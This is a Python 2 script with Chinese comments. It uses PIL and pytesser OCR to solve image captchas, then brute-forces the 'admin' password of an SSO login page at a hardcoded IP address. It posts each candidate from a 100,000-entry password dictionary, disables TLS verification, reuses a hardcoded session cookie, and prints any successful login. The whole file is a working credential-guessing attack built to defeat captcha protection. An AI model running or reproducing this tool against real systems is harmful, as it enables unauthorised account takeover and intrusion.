#!/usr/bin/env python
#coding=utf-8

''' 采用PIL 和pytesser进行简单的验证码识别
程序包中已经包含了pytesser，但是需要自己安装PIL

使用样例
getverify('v1.jpg') 返回值为识别出的字符

'''
import Image
import ImageEnhance
import ImageFilter
import sys
from pytesser import *
import re
import requests

request = requests.session()


def  getverify(name,threshold=210,repflag=True):
    # 二值化
    threshold = 30
    #name = 'captcha.jpg'
    threshold = threshold   # 0 - 255之间进行修改
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    
    #打开图片
    im = Image.open(name)
    # 去除多余颜色
    img1 = im.convert('RGB')
#    for i in xrange(1,63):
#        for j in xrange(1,23):
#            r,g,b  = img1.getpixel((i,j))
#            if b +g+r>610 and b>200 and g>200 and r >200: #对蓝色进行判断
#                r,g,b  = 255,255,255
#            img1.putpixel((i,j), (r,g,b))

    img1.save(name[:name.rfind('.')] + '.a.' + name[name.rfind('.')+1:])
    #转化到亮度
    img2 = img1.convert('L')
    img2.save(name[:name.rfind('.')] + '.b.' + name[name.rfind('.')+1:])
    #二值化
    img3 = img2.point(table,'1')
    img3.save(name[:name.rfind('.')] + '.c.' + name[name.rfind('.')+1:])
    #识别
    text = image_to_string(img3)
    #识别对吗
    text = text.strip()
    text = text.upper();

    #由于都是数字
    #对于识别成字母的 采用该表进行修正
    rep={'O':'0',
        'I':'1','L':'1',
        'Z':'2',
        'S':'5'
    };
    if repflag:
        for r in rep:
            text = text.replace(r,rep[r])
    return text

def get_captcha(url,headers):
    try:
        res = request.get(url=url,headers = headers,verify=False)
        with open('picture.jpg', 'wb') as file:
            file.write(res.content)
        captcha = getverify('picture.jpg')

    except:
        return  "error for get captcha"
    return captcha.strip(' ')

def get_login_html(url,headers):
    pass

def login(url,data,headers,key,regex = True):
    try:
        res = request.post(url=url,data=data,headers = headers,verify=False)
        # print(res.text)
        if regex:
            pattern = re.compile(key)
            match = re.search(pattern,res.text)
            if match:
                return match.group()
        else:
            pass
        
    except:
        return  "error for login"
    
    return res.text

def parameter_hander(parameter):
    temp = []
    for key in parameter:
       temp.append(key+'='+parameter[key])
    data = '&'.join(temp)
    return data
    
    
    
if __name__ == '__main__':
    captcha_url = 'https://188.103.31.4/SSOSvr/captcha?s=0.3718152061948118'
    login_url = 'https://188.103.31.4/SSOSvr/login'
    headers = {
        'Cookie' : 'SSOsession=8AFBF041F69457C7AD4C3FC71458A6A3; locale=zh_CN; language=zh_CN; Secure=true; HttpOnly=true',
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Host': '188.103.31.4',
        'Referer' : 'https://188.103.31.4/SSOSvr/login',
    }
    parameter = {
        'username':'admin',
        'password':'1qaz2wsx',
        'j_captcha_parameter': '',
        'lt':'e2s7',
        '_eventId':'submit',
        'userType':'1',
        'submit':'%E7%99%BB%E5%BD%95',
        
    }
    passwords = []
    with open('C:\\Soft\\MyTools\\Script\\dic\\100000_password.txt','r') as f:
        for line in f.readlines():
            passwords.append(line.strip('\r').strip('\n'))
    
    # login
    passwords= ['eee','xxx']

    res = ''
    for password in passwords:
        parameter['password'] = password
        
        while True:
            parameter['j_captcha_parameter'] = get_captcha(captcha_url,headers).lower()
            res = login(login_url,parameter,headers,str,False)
            if u'验证码过期' not in res and u'<li>验证码无效</li>' not in res:
                break
        
        data = parameter_hander(parameter)
        if u'用户名或密码错误' in res:
            print '[password invalid]: ' + data
        elif u'password 的长度必须在 1 和 32 之间' in res:
            print '[password length error]: ' + data
        else:
            print res
            print '[success]: ' + data
    
    
    
    

